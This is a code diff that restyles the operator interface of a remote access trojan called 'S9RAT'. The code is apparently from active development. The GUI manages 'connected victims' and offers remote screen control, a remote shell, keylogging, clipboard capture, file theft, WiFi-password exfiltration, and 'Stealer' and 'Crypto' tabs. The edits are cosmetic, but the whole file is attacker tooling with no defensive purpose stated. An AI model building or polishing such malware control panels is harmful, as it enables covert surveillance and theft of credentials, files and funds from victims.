@@ -17,15 +17,15 @@ except ImportError:
     HAS_GUI = False
 
 THEME = {
-    "bg": "#0a0a0c",
-    "panel": "#111115",
-    "panel_light": "#1a1a20",
-    "toolbar": "#0e0e12",
-    "card": "#18181e",
-    "card_hover": "#22222a",
-    "accent": "#d4a017",
-    "accent_hover": "#e8b828",
-    "accent_dim": "#8a6a0f",
+    "bg": "#08080a",
+    "panel": "#0e0e12",
+    "panel_light": "#161619",
+    "toolbar": "#0a0a0e",
+    "card": "#141418",
+    "card_hover": "#1c1c22",
+    "accent": "#d4af37",
+    "accent_hover": "#e5c04a",
+    "accent_dim": "#8b7319",
     "green": "#2ecc71",
     "green_dark": "#27ae60",
     "red": "#e74c3c",
@@ -34,9 +34,10 @@ THEME = {
     "amber_dark": "#d68910",
     "cyan": "#00d2d3",
     "text": "#e8e8e8",
-    "text_dim": "#7a7a85",
-    "text_muted": "#4a4a55",
-    "border": "#2a2a32",
+    "text_dim": "#8a8a95",
+    "text_muted": "#505060",
+    "border": "#2a2a30",
+    "border_gold": "#3a3520",
     "black": "#000000",
 }
 
@@ -98,99 +99,109 @@ class HackerGUI:
         self._build_status_bar()
 
     def _build_sidebar(self, parent):
-        sidebar = ctk.CTkFrame(parent, fg_color=THEME["panel"], width=240)
-        sidebar.pack(side="left", fill="y", padx=(0, 4))
+        sidebar = ctk.CTkFrame(parent, fg_color=THEME["panel"], width=240, corner_radius=0)
+        sidebar.pack(side="left", fill="y", padx=(0, 0))
         sidebar.pack_propagate(False)
 
+        ctk.CTkFrame(sidebar, fg_color=THEME["accent"], height=2).pack(fill="x")
+
         header_frame = ctk.CTkFrame(sidebar, fg_color="transparent")
-        header_frame.pack(fill="x", padx=12, pady=(12, 4))
-        ctk.CTkLabel(header_frame, text="S9RAT", font=("Segoe UI", 16, "bold"),
+        header_frame.pack(fill="x", padx=16, pady=(16, 4))
+        ctk.CTkLabel(header_frame, text="S9", font=("Segoe UI", 20, "bold"),
                       text_color=THEME["accent"]).pack(side="left")
-        ctk.CTkLabel(header_frame, text="v2.0", font=("Segoe UI", 10),
-                      text_color=THEME["text_muted"]).pack(side="left", padx=(4, 0), pady=(4, 0))
+        ctk.CTkLabel(header_frame, text="RAT", font=("Segoe UI", 20, "bold"),
+                      text_color=THEME["text"]).pack(side="left")
+        ctk.CTkLabel(header_frame, text="v2.0", font=("Segoe UI", 9),
+                      text_color=THEME["text_muted"]).pack(side="left", padx=(6, 0), pady=(6, 0))
 
         status_frame = ctk.CTkFrame(sidebar, fg_color="transparent")
-        status_frame.pack(fill="x", padx=12, pady=(2, 6))
+        status_frame.pack(fill="x", padx=16, pady=(4, 8))
         self.server_status_label = ctk.CTkLabel(status_frame, text="● Online",
                                                  font=("Segoe UI", 10, "bold"),
-                                                 text_color=THEME["green"])
+                                                 text_color=THEME["accent"])
         self.server_status_label.pack(side="left")
 
-        ctk.CTkFrame(sidebar, fg_color=THEME["border"], height=1).pack(fill="x", padx=12, pady=4)
+        ctk.CTkFrame(sidebar, fg_color=THEME["border_gold"], height=1).pack(fill="x", padx=16, pady=4)
 
         victims_header = ctk.CTkFrame(sidebar, fg_color="transparent")
-        victims_header.pack(fill="x", padx=12, pady=(4, 2))
-        ctk.CTkLabel(victims_header, text="CONNECTED VICTIMS", font=("Segoe UI", 10, "bold"),
-                      text_color=THEME["text_dim"]).pack(side="left")
+        victims_header.pack(fill="x", padx=16, pady=(8, 4))
+        ctk.CTkLabel(victims_header, text="CONNECTED", font=("Segoe UI", 9, "bold"),
+                      text_color=THEME["text_muted"]).pack(side="left")
         self.client_count_label = ctk.CTkLabel(victims_header, text="0",
                                                  font=("Segoe UI", 10, "bold"),
                                                  text_color=THEME["accent"])
         self.client_count_label.pack(side="right")
 
         self.client_list = ctk.CTkScrollableFrame(sidebar, fg_color="transparent",
-                                                    scrollbar_button_color=THEME["border"],
-                                                    scrollbar_button_hover_color=THEME["card_hover"])
+                                                    scrollbar_button_color=THEME["accent_dim"],
+                                                    scrollbar_button_hover_color=THEME["accent"])
         self.client_list.pack(fill="both", expand=True, padx=8, pady=(4, 0))
 
         btn_frame = ctk.CTkFrame(sidebar, fg_color="transparent")
-        btn_frame.pack(fill="x", padx=8, pady=8)
+        btn_frame.pack(fill="x", padx=12, pady=12)
         ctk.CTkButton(btn_frame, text="Refresh", command=self._refresh_clients,
-                       fg_color=THEME["card"], hover_color=THEME["card_hover"],
-                       text_color=THEME["text"], height=32, font=("Segoe UI", 11)).pack(fill="x")
+                       fg_color=THEME["accent_dim"], hover_color=THEME["accent"],
+                       text_color=THEME["text"], height=32, font=("Segoe UI", 11, "bold"),
+                       corner_radius=6).pack(fill="x")
 
     def _build_center(self, parent):
-        center = ctk.CTkFrame(parent, fg_color=THEME["panel"])
-        center.pack(side="left", fill="both", expand=True, padx=(0, 4))
+        center = ctk.CTkFrame(parent, fg_color=THEME["panel"], corner_radius=0)
+        center.pack(side="left", fill="both", expand=True, padx=(0, 0))
 
-        toolbar = ctk.CTkFrame(center, fg_color=THEME["toolbar"], height=48)
-        toolbar.pack(fill="x", padx=8, pady=(8, 4))
+        toolbar = ctk.CTkFrame(center, fg_color=THEME["toolbar"], height=48, corner_radius=0)
+        toolbar.pack(fill="x", padx=0, pady=0)
 
-        self.stream_btn = ctk.CTkButton(toolbar, text="  Start Stream  ",
+        toolbar_inner = ctk.CTkFrame(toolbar, fg_color="transparent")
+        toolbar_inner.pack(fill="x", padx=12, pady=8)
+
+        self.stream_btn = ctk.CTkButton(toolbar_inner, text="  Start Stream  ",
                                          command=self._toggle_stream,
-                                         fg_color="transparent", border_width=2,
-                                         border_color=THEME["green"],
-                                         text_color=THEME["green"], width=130, height=32,
-                                         font=("Segoe UI", 11, "bold"))
-        self.stream_btn.pack(side="left", padx=(0, 4))
+                                         fg_color="transparent", border_width=1,
+                                         border_color=THEME["accent"],
+                                         text_color=THEME["accent"], width=130, height=32,
+                                         font=("Segoe UI", 11, "bold"), corner_radius=4)
+        self.stream_btn.pack(side="left", padx=(0, 8))
 
-        sep1 = ctk.CTkFrame(toolbar, fg_color=THEME["accent_dim"], width=1, height=20)
+        sep1 = ctk.CTkFrame(toolbar_inner, fg_color=THEME["accent_dim"], width=1, height=20)
         sep1.pack(side="left", padx=4, pady=6)
 
-        self.control_btn = ctk.CTkButton(toolbar, text="  Enable Control  ",
+        self.control_btn = ctk.CTkButton(toolbar_inner, text="  Enable Control  ",
                                           command=self._toggle_control,
-                                          fg_color="transparent", border_width=2,
+                                          fg_color="transparent", border_width=1,
                                           border_color=THEME["amber"],
                                           text_color=THEME["amber"], width=140, height=32,
-                                          font=("Segoe UI", 11, "bold"))
-        self.control_btn.pack(side="left", padx=4)
+                                          font=("Segoe UI", 11, "bold"), corner_radius=4)
+        self.control_btn.pack(side="left", padx=8)
 
-        sep2 = ctk.CTkFrame(toolbar, fg_color=THEME["accent_dim"], width=1, height=20)
+        sep2 = ctk.CTkFrame(toolbar_inner, fg_color=THEME["accent_dim"], width=1, height=20)
         sep2.pack(side="left", padx=4, pady=6)
 
-        self.client_label = ctk.CTkLabel(toolbar, text="No client selected",
+        self.client_label = ctk.CTkLabel(toolbar_inner, text="No client selected",
                                           font=("Segoe UI", 12), text_color=THEME["text_dim"])
         self.client_label.pack(side="left", padx=12)
 
-        self.fps_label = ctk.CTkLabel(toolbar, text="", font=("Consolas", 10),
+        self.fps_label = ctk.CTkLabel(toolbar_inner, text="", font=("Consolas", 10),
                                        text_color=THEME["text_muted"])
         self.fps_label.pack(side="right", padx=8)
 
         self._build_screen_tabs(center)
 
+        ctk.CTkFrame(center, fg_color=THEME["accent_dim"], height=1).pack(fill="x", padx=16, pady=4)
+
         nav_frame = ctk.CTkFrame(center, fg_color="transparent")
-        nav_frame.pack(fill="x", padx=8, pady=(4, 0))
+        nav_frame.pack(fill="x", padx=12, pady=(8, 4))
         self.feature_var = tk.StringVar(value="screen")
         features = [
-            ("🖥 Screen", "screen"),
-            ("💻 Terminal", "terminal"),
-            ("⚙ Processes", "processes"),
-            ("⌨ Keylog", "keylog"),
-            ("📋 Clipboard", "clipboard"),
-            ("💬 Chat", "chat"),
-            ("📁 Files", "files"),
-            ("📊 Exfil", "exfil"),
-            ("🔑 Stealer", "stealer"),
-            ("🪙 Crypto", "crypto"),
+            ("Screen", "screen"),
+            ("Terminal", "terminal"),
+            ("Processes", "processes"),
+            ("Keylog", "keylog"),
+            ("Clipboard", "clipboard"),
+            ("Chat", "chat"),
+            ("Files", "files"),
+            ("Exfil", "exfil"),
+            ("Stealer", "stealer"),
+            ("Crypto", "crypto"),
         ]
         for label, val in features:
             btn = ctk.CTkButton(
@@ -198,13 +209,13 @@ class HackerGUI:
                 command=lambda v=val: self._switch_feature_to(v),
                 fg_color=THEME["card"], text_color=THEME["text_dim"],
                 hover_color=THEME["card_hover"],
-                height=30, font=("Segoe UI", 10),
-                corner_radius=14)
-            btn.pack(side="left", padx=2, pady=2)
+                height=30, font=("Segoe UI", 10, "bold"),
+                corner_radius=6)
+            btn.pack(side="left", padx=3, pady=2)
             self._tab_buttons[val] = btn
 
-        self.feature_container = ctk.CTkFrame(center, fg_color=THEME["panel"])
-        self.feature_container.pack(fill="both", expand=True, padx=8, pady=(4, 8))
+        self.feature_container = ctk.CTkFrame(center, fg_color=THEME["bg"], corner_radius=8)
+        self.feature_container.pack(fill="both", expand=True, padx=12, pady=(8, 12))
 
         self._build_feature_screen()
         self._build_feature_terminal()
@@ -234,12 +245,13 @@ class HackerGUI:
                               hover_color=THEME["card_hover"])
 
     def _build_screen_tabs(self, parent):
-        screen_outer = ctk.CTkFrame(parent, fg_color=THEME["black"])
-        screen_outer.pack(fill="both", expand=True, padx=8, pady=4)
+        screen_outer = ctk.CTkFrame(parent, fg_color=THEME["black"], corner_radius=8)
+        screen_outer.pack(fill="both", expand=True, padx=12, pady=(8, 4))
         self.screen_outer = screen_outer
 
-        self.screen_canvas = tk.Canvas(screen_outer, bg=THEME["black"], highlightthickness=0)
-        self.screen_canvas.pack(fill="both", expand=True)
+        self.screen_canvas = tk.Canvas(screen_outer, bg=THEME["black"], highlightthickness=0,
+                                        highlightbackground=THEME["border_gold"])
+        self.screen_canvas.pack(fill="both", expand=True, padx=2, pady=2)
         self.screen_canvas.bind("<Button-1>", self._on_mouse_click)
         self.screen_canvas.bind("<B1-Motion>", self._on_mouse_drag)
         self.screen_canvas.bind("<ButtonRelease-1>", self._on_mouse_release)
@@ -252,26 +264,28 @@ class HackerGUI:
         self.monitor_menu = ctk.CTkOptionMenu(screen_outer, variable=self.monitor_var,
                                                 values=["All Screens"],
                                                 command=self._on_monitor_select,
-                                                fg_color=THEME["card"],
+                                                fg_color=THEME["accent_dim"],
                                                 button_color=THEME["accent"],
                                                 button_hover_color=THEME["accent_hover"],
                                                 text_color=THEME["text"],
                                                 dropdown_fg_color=THEME["panel"],
                                                 dropdown_hover_color=THEME["card_hover"],
                                                 width=160, height=28,
-                                                font=("Segoe UI", 10))
+                                                font=("Segoe UI", 10, "bold"))
         self.monitor_menu.place(relx=1.0, rely=0.0, anchor="ne", x=-8, y=8)
 
     def _build_right_panel(self, parent):
-        right = ctk.CTkFrame(parent, fg_color=THEME["panel"], width=260)
+        right = ctk.CTkFrame(parent, fg_color=THEME["panel"], width=260, corner_radius=0)
         right.pack(side="right", fill="y")
         right.pack_propagate(False)
 
-        ctk.CTkLabel(right, text="POWER", font=("Segoe UI", 11, "bold"),
-                      text_color=THEME["red"]).pack(padx=12, pady=(12, 4), anchor="w")
+        ctk.CTkFrame(right, fg_color=THEME["accent"], height=2).pack(fill="x")
+
+        ctk.CTkLabel(right, text="POWER", font=("Segoe UI", 10, "bold"),
+                      text_color=THEME["accent"]).pack(padx=16, pady=(16, 8), anchor="w")
 
         power_frame = ctk.CTkFrame(right, fg_color="transparent")
-        power_frame.pack(fill="x", padx=8, pady=4)
+        power_frame.pack(fill="x", padx=12, pady=4)
         for label, cmd, color in [
             ("Shutdown", "shutdown", THEME["red"]),
             ("Restart", "restart", THEME["amber"]),
@@ -279,58 +293,59 @@ class HackerGUI:
         ]:
             ctk.CTkButton(power_frame, text=label,
                            command=lambda c=cmd: self._power_action(c),
-                           fg_color="transparent", border_width=2,
+                           fg_color="transparent", border_width=1,
                            border_color=color, text_color=color, height=28,
-                           font=("Segoe UI", 10, "bold")).pack(fill="x", pady=2)
+                           font=("Segoe UI", 10, "bold"), corner_radius=4).pack(fill="x", pady=2)
 
-        ctk.CTkFrame(right, fg_color=THEME["border"], height=1).pack(fill="x", padx=12, pady=8)
+        ctk.CTkFrame(right, fg_color=THEME["border_gold"], height=1).pack(fill="x", padx=16, pady=12)
 
-        ctk.CTkLabel(right, text="REMOTE ACTIONS", font=("Segoe UI", 11, "bold"),
-                      text_color=THEME["accent"]).pack(padx=12, pady=(0, 4), anchor="w")
+        ctk.CTkLabel(right, text="REMOTE", font=("Segoe UI", 10, "bold"),
+                      text_color=THEME["accent"]).pack(padx=16, pady=(0, 8), anchor="w")
 
         actions_frame = ctk.CTkFrame(right, fg_color="transparent")
-        actions_frame.pack(fill="x", padx=8, pady=4)
+        actions_frame.pack(fill="x", padx=12, pady=4)
 
         ctk.CTkButton(actions_frame, text="Chat Message",
                        command=self._send_chat_popup,
-                       fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
-                       text_color=THEME["black"], height=30,
-                       font=("Segoe UI", 10)).pack(fill="x", pady=2)
+                       fg_color=THEME["accent_dim"], hover_color=THEME["accent"],
+                       text_color=THEME["text"], height=30,
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(fill="x", pady=2)
 
-        ctk.CTkButton(actions_frame, text="Refresh Clipboard",
+        ctk.CTkButton(actions_frame, text="Clipboard",
                        command=self._refresh_clipboard,
-                       fg_color=THEME["amber"], hover_color=THEME["amber_dark"],
-                       text_color=THEME["black"], height=30,
-                       font=("Segoe UI", 10)).pack(fill="x", pady=2)
+                       fg_color=THEME["card"], hover_color=THEME["card_hover"],
+                       text_color=THEME["text"], height=30,
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(fill="x", pady=2)
 
         ctk.CTkButton(actions_frame, text="Screenshot",
                        command=self._take_screenshot,
-                       fg_color=THEME["cyan"], hover_color=THEME["cyan"],
-                       text_color=THEME["black"], height=30,
-                       font=("Segoe UI", 10)).pack(fill="x", pady=2)
+                       fg_color=THEME["card"], hover_color=THEME["card_hover"],
+                       text_color=THEME["text"], height=30,
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(fill="x", pady=2)
 
-        ctk.CTkFrame(right, fg_color=THEME["border"], height=1).pack(fill="x", padx=12, pady=8)
+        ctk.CTkFrame(right, fg_color=THEME["border_gold"], height=1).pack(fill="x", padx=16, pady=12)
 
-        ctk.CTkLabel(right, text="PROTOCOL", font=("Segoe UI", 11, "bold"),
-                      text_color=THEME["accent"]).pack(padx=12, pady=(0, 2), anchor="w")
-        ctk.CTkLabel(right, text="Protocol v2.0", font=("Segoe UI", 10),
-                      text_color=THEME["text_dim"]).pack(padx=12, anchor="w")
+        ctk.CTkLabel(right, text="PROTOCOL", font=("Segoe UI", 10, "bold"),
+                      text_color=THEME["accent"]).pack(padx=16, pady=(0, 2), anchor="w")
+        ctk.CTkLabel(right, text="v2.0", font=("Segoe UI", 9),
+                      text_color=THEME["text_muted"]).pack(padx=16, anchor="w")
 
-        ctk.CTkFrame(right, fg_color=THEME["border"], height=1).pack(fill="x", padx=12, pady=8)
+        ctk.CTkFrame(right, fg_color=THEME["border_gold"], height=1).pack(fill="x", padx=16, pady=12)
 
-        ctk.CTkLabel(right, text="INFO", font=("Segoe UI", 11, "bold"),
-                      text_color=THEME["accent"]).pack(padx=12, pady=(0, 4), anchor="w")
+        ctk.CTkLabel(right, text="INFO", font=("Segoe UI", 10, "bold"),
+                      text_color=THEME["accent"]).pack(padx=16, pady=(0, 8), anchor="w")
 
         self.info_text = ctk.CTkTextbox(right, fg_color=THEME["card"],
                                           text_color=THEME["text"],
-                                          font=("Consolas", 10), height=200)
-        self.info_text.pack(fill="x", padx=8, pady=(0, 8))
+                                          font=("Consolas", 10), height=200,
+                                          border_width=1, border_color=THEME["border_gold"])
+        self.info_text.pack(fill="x", padx=12, pady=(0, 12))
 
     def _build_status_bar(self):
-        self.status_bar = ctk.CTkFrame(self.root, fg_color=THEME["toolbar"], height=28)
+        self.status_bar = ctk.CTkFrame(self.root, fg_color=THEME["toolbar"], height=28, corner_radius=0)
         self.status_bar.pack(fill="x", side="bottom")
         self.status_label = ctk.CTkLabel(self.status_bar, text="Ready",
-                                          font=("Consolas", 9), text_color=THEME["text_muted"])
+                                          font=("Consolas", 9), text_color=THEME["accent_dim"])
         self.status_label.pack(side="left", padx=12)
         self.clock_label = ctk.CTkLabel(self.status_bar, text=time.strftime("%H:%M:%S"),
                                          font=("Consolas", 9), text_color=THEME["text_muted"])
@@ -344,124 +359,129 @@ class HackerGUI:
         self._screen_frame = self.feature_container
 
     def _build_feature_terminal(self):
-        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])
+        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["bg"])
 
         input_frame = ctk.CTkFrame(frame, fg_color="transparent")
-        input_frame.pack(fill="x", padx=8, pady=8)
+        input_frame.pack(fill="x", padx=12, pady=12)
         ctk.CTkLabel(input_frame, text="$", font=("Consolas", 14, "bold"),
-                      text_color=THEME["green"]).pack(side="left", padx=(0, 4))
+                      text_color=THEME["accent"]).pack(side="left", padx=(0, 8))
         self.shell_input = ctk.CTkEntry(input_frame, placeholder_text="Enter command...",
-                                          fg_color=THEME["card"], text_color=THEME["green"],
-                                          border_color=THEME["border"],
+                                          fg_color=THEME["card"], text_color=THEME["accent"],
+                                          border_color=THEME["border_gold"],
                                           font=("Consolas", 12), height=36)
         self.shell_input.pack(side="left", fill="x", expand=True)
         self.shell_input.bind("<Return>", self._send_shell_command)
         ctk.CTkButton(input_frame, text="Run", command=self._send_shell_command,
-                       fg_color=THEME["green"], hover_color=THEME["green_dark"],
+                       fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                        text_color=THEME["black"], width=60, height=36,
-                       font=("Consolas", 11, "bold")).pack(side="right", padx=(4, 0))
+                       font=("Consolas", 11, "bold"), corner_radius=4).pack(side="right", padx=(8, 0))
 
         self.shell_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
-                                           text_color=THEME["green"],
-                                           font=("Consolas", 11), height=400)
-        self.shell_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
+                                           text_color=THEME["accent"],
+                                           font=("Consolas", 11), height=400,
+                                           border_width=1, border_color=THEME["border_gold"])
+        self.shell_text.pack(fill="both", expand=True, padx=12, pady=(0, 12))
 
         self._terminal_frame = frame
 
     def _build_feature_processes(self):
-        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])
+        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["bg"])
 
         btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
-        btn_frame.pack(fill="x", padx=8, pady=8)
+        btn_frame.pack(fill="x", padx=12, pady=12)
         ctk.CTkButton(btn_frame, text="Refresh Processes",
                        command=self._refresh_processes,
-                       fg_color=THEME["green"], hover_color=THEME["green_dark"],
-                       text_color=THEME["black"], height=30,
-                       font=("Segoe UI", 10)).pack(side="left", padx=(0, 4))
+                       fg_color=THEME["accent_dim"], hover_color=THEME["accent"],
+                       text_color=THEME["text"], height=30,
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(side="left", padx=(0, 8))
         ctk.CTkButton(btn_frame, text="Kill Selected",
                        command=self._kill_selected_process,
                        fg_color=THEME["red"], hover_color=THEME["red_dark"],
-                       text_color=THEME["black"], height=30,
-                       font=("Segoe UI", 10)).pack(side="left", padx=4)
+                       text_color=THEME["text"], height=30,
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(side="left", padx=4)
 
         cols = ("PID", "Name", "User", "CPU%", "Mem%")
         self.process_tree = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                             text_color=THEME["text"],
-                                            font=("Consolas", 10))
-        self.process_tree.pack(fill="both", expand=True, padx=8, pady=(0, 8))
+                                            font=("Consolas", 10),
+                                            border_width=1, border_color=THEME["border_gold"])
+        self.process_tree.pack(fill="both", expand=True, padx=12, pady=(0, 12))
 
         self._processes_frame = frame
 
     def _build_feature_keylog(self):
-        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])
+        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["bg"])
 
         btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
-        btn_frame.pack(fill="x", padx=8, pady=8)
+        btn_frame.pack(fill="x", padx=12, pady=12)
         self.keylog_btn = ctk.CTkButton(btn_frame, text="Start Keylogger",
                                          command=self._toggle_keylog,
-                                         fg_color=THEME["green"], hover_color=THEME["green_dark"],
-                                         text_color=THEME["black"], height=30,
-                                         font=("Segoe UI", 10))
-        self.keylog_btn.pack(side="left", padx=(0, 4))
+                                         fg_color=THEME["accent_dim"], hover_color=THEME["accent"],
+                                         text_color=THEME["text"], height=30,
+                                         font=("Segoe UI", 10, "bold"), corner_radius=4)
+        self.keylog_btn.pack(side="left", padx=(0, 8))
         ctk.CTkButton(btn_frame, text="Clear",
                        command=self._clear_keylog,
                        fg_color=THEME["card"], hover_color=THEME["card_hover"],
-                       text_color=THEME["text"], height=30,
-                       font=("Segoe UI", 10)).pack(side="left", padx=4)
+                       text_color=THEME["text_dim"], height=30,
+                       font=("Segoe UI", 10), corner_radius=4).pack(side="left", padx=4)
 
         self.keylog_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
-                                           text_color=THEME["green"],
-                                           font=("Consolas", 12))
-        self.keylog_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
+                                           text_color=THEME["accent"],
+                                           font=("Consolas", 12),
+                                           border_width=1, border_color=THEME["border_gold"])
+        self.keylog_text.pack(fill="both", expand=True, padx=12, pady=(0, 12))
 
         self._keylog_frame = frame
 
     def _build_feature_clipboard(self):
-        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])
+        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["bg"])
 
         btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
-        btn_frame.pack(fill="x", padx=8, pady=8)
+        btn_frame.pack(fill="x", padx=12, pady=12)
         ctk.CTkButton(btn_frame, text="Get Clipboard",
                        command=self._refresh_clipboard,
-                       fg_color=THEME["green"], hover_color=THEME["green_dark"],
-                       text_color=THEME["black"], height=30,
-                       font=("Segoe UI", 10)).pack(side="left")
+                       fg_color=THEME["accent_dim"], hover_color=THEME["accent"],
+                       text_color=THEME["text"], height=30,
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(side="left")
 
         self.clipboard_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
-                                              text_color=THEME["amber"],
-                                              font=("Consolas", 12))
-        self.clipboard_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
+                                              text_color=THEME["accent"],
+                                              font=("Consolas", 12),
+                                              border_width=1, border_color=THEME["border_gold"])
+        self.clipboard_text.pack(fill="both", expand=True, padx=12, pady=(0, 12))
 
         self._clipboard_frame = frame
 
     def _build_feature_chat(self):
-        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])
+        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["bg"])
 
         self.chat_display = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                             text_color=THEME["text"],
-                                            font=("Segoe UI", 11))
-        self.chat_display.pack(fill="both", expand=True, padx=8, pady=8)
+                                            font=("Segoe UI", 11),
+                                            border_width=1, border_color=THEME["border_gold"])
+        self.chat_display.pack(fill="both", expand=True, padx=12, pady=12)
 
         input_frame = ctk.CTkFrame(frame, fg_color="transparent")
-        input_frame.pack(fill="x", padx=8, pady=(0, 8))
+        input_frame.pack(fill="x", padx=12, pady=(0, 12))
         self.chat_input = ctk.CTkEntry(input_frame, placeholder_text="Type message...",
                                         fg_color=THEME["card"], text_color=THEME["text"],
-                                        border_color=THEME["border"],
+                                        border_color=THEME["border_gold"],
                                         font=("Segoe UI", 11), height=36)
         self.chat_input.pack(side="left", fill="x", expand=True)
         self.chat_input.bind("<Return>", self._send_chat)
         ctk.CTkButton(input_frame, text="Send", command=self._send_chat,
                        fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                        text_color=THEME["black"], width=60, height=36,
-                       font=("Segoe UI", 10, "bold")).pack(side="right", padx=(4, 0))
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(side="right", padx=(8, 0))
 
         self._chat_frame = frame
 
     def _build_feature_exfil(self):
-        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])
+        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["bg"])
 
         btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
-        btn_frame.pack(fill="x", padx=8, pady=8)
+        btn_frame.pack(fill="x", padx=12, pady=12)
         exfil_buttons = [
             ("System Info", "system_info"),
             ("WiFi Passwords", "wifi_passwords"),
@@ -473,31 +493,32 @@ class HackerGUI:
         for label, exfil_type in exfil_buttons:
             ctk.CTkButton(btn_frame, text=label,
                            command=lambda t=exfil_type: self._request_exfil(t),
-                           fg_color=THEME["card"], hover_color=THEME["card_hover"],
+                           fg_color=THEME["card"], hover_color=THEME["accent_dim"],
                            text_color=THEME["text"], height=30,
-                           font=("Segoe UI", 10)).pack(side="left", padx=2)
+                           font=("Segoe UI", 10, "bold"), corner_radius=4).pack(side="left", padx=3)
 
         self.exfil_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                           text_color=THEME["text"],
-                                          font=("Consolas", 10))
-        self.exfil_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
+                                          font=("Consolas", 10),
+                                          border_width=1, border_color=THEME["border_gold"])
+        self.exfil_text.pack(fill="both", expand=True, padx=12, pady=(0, 12))
 
         self._exfil_frame = frame
 
     def _build_feature_files(self):
-        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])
+        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["bg"])
 
         nav_frame = ctk.CTkFrame(frame, fg_color="transparent")
-        nav_frame.pack(fill="x", padx=8, pady=8)
+        nav_frame.pack(fill="x", padx=12, pady=12)
 
         ctk.CTkButton(nav_frame, text="< Back", command=self._file_browse_back,
                        fg_color=THEME["card"], hover_color=THEME["card_hover"],
                        text_color=THEME["text"], width=60, height=30,
-                       font=("Segoe UI", 10)).pack(side="left", padx=(0, 4))
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(side="left", padx=(0, 8))
 
         self.file_path_entry = ctk.CTkEntry(nav_frame, placeholder_text="Enter path...",
                                               fg_color=THEME["card"], text_color=THEME["text"],
-                                              border_color=THEME["border"],
+                                              border_color=THEME["border_gold"],
                                               font=("Consolas", 11), height=30)
         self.file_path_entry.pack(side="left", fill="x", expand=True, padx=4)
         self.file_path_entry.bind("<Return>", self._file_browse_go)
@@ -505,30 +526,31 @@ class HackerGUI:
         ctk.CTkButton(nav_frame, text="Go", command=self._file_browse_go,
                        fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                        text_color=THEME["black"], width=40, height=30,
-                       font=("Segoe UI", 10, "bold")).pack(side="left", padx=4)
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(side="left", padx=4)
 
         ctk.CTkButton(nav_frame, text="Refresh", command=self._file_browse_refresh,
-                       fg_color=THEME["green"], hover_color=THEME["green_dark"],
-                       text_color=THEME["black"], width=60, height=30,
-                       font=("Segoe UI", 10)).pack(side="left", padx=4)
+                       fg_color=THEME["accent_dim"], hover_color=THEME["accent"],
+                       text_color=THEME["text"], width=60, height=30,
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(side="left", padx=4)
 
         btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
-        btn_frame.pack(fill="x", padx=8, pady=(0, 4))
+        btn_frame.pack(fill="x", padx=12, pady=(0, 8))
 
         ctk.CTkButton(btn_frame, text="Download", command=self._file_download,
-                       fg_color=THEME["cyan"], hover_color=THEME["cyan"],
-                       text_color=THEME["black"], height=28,
-                       font=("Segoe UI", 10)).pack(side="left", padx=2)
+                       fg_color=THEME["accent_dim"], hover_color=THEME["accent"],
+                       text_color=THEME["text"], height=28,
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(side="left", padx=3)
 
         ctk.CTkButton(btn_frame, text="Upload", command=self._file_upload,
-                       fg_color=THEME["amber"], hover_color=THEME["amber_dark"],
-                       text_color=THEME["black"], height=28,
-                       font=("Segoe UI", 10)).pack(side="left", padx=2)
+                       fg_color=THEME["card"], hover_color=THEME["card_hover"],
+                       text_color=THEME["text"], height=28,
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(side="left", padx=3)
 
         self.file_list_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                                text_color=THEME["text"],
-                                               font=("Consolas", 10))
-        self.file_list_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
+                                               font=("Consolas", 10),
+                                               border_width=1, border_color=THEME["border_gold"])
+        self.file_list_text.pack(fill="both", expand=True, padx=12, pady=(0, 12))
         self.file_list_text.bind("<Double-Button-1>", self._file_browse_double_click)
 
         self._files_frame = frame
@@ -536,38 +558,40 @@ class HackerGUI:
         self._browse_history = []
 
     def _build_feature_stealer(self):
-        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])
+        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["bg"])
 
         btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
-        btn_frame.pack(fill="x", padx=8, pady=8)
